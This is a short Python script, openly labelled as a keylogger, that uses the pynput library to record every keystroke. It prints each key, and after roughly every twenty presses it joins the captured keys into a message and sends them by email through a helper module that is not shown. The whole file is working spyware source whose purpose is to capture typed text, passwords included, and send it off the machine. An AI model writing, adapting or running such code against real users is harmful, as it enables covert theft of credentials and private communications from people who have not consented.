from email import message
import pynput
from pynput.keyboard import Key, Listener
import send_email

keys = []
count = 0

print('''
 _   __           _                                 
| | / /          | |                                
| |/ /  ___ _   _| |     ___   __ _  __ _  ___ _ __ 
|    \ / _ \ | | | |    / _ \ / _` |/ _` |/ _ \ '__|
| |\  \  __/ |_| | |___| (_) | (_| | (_| |  __/ |   
\_| \_/\___|\__, \_____/\___/ \__, |\__, |\___|_|   
             __/ |             __/ | __/ |          
            |___/             |___/ |___/           
''')

def on_press(key):
    print(key, " ")
    print("pressed")
    
    global keys, count
    
    keys.append(str(key))
    count += 1
    
    if count > 20:
        count = 0
        email(keys)
        
def email(keys):
    message = ""
    
    for key in keys:
        k = key.replace("'", "")
        if key == Key.space:
            key = " "
        
        message += k
        
    print(message)
    send_email.sendEmail(message)
        
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
